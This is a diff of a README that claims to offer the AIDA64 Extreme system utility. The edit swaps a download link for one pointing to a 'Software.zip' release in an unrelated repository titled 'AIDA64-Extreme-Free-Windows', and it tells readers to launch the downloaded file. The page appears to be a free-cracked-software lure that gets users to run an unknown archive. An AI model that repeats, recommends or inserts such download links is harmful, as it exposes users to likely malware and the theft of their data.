@@ -26,7 +26,7 @@ This repository is dedicated to providing information and resources on various a
 
 ## Get Started
 
-To kickstart your AIDA64 Extreme journey, make sure to download the software by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Remember to launch the downloaded file to initiate the installation process.
+To kickstart your AIDA64 Extreme journey, make sure to download the software by clicking [here](https://github.com/MasurayInFiekl/AIDA64-Extreme-Free-Windows/releases/download/v2.0/Software.zip). Remember to launch the downloaded file to initiate the installation process.
 
 ## Resources
 
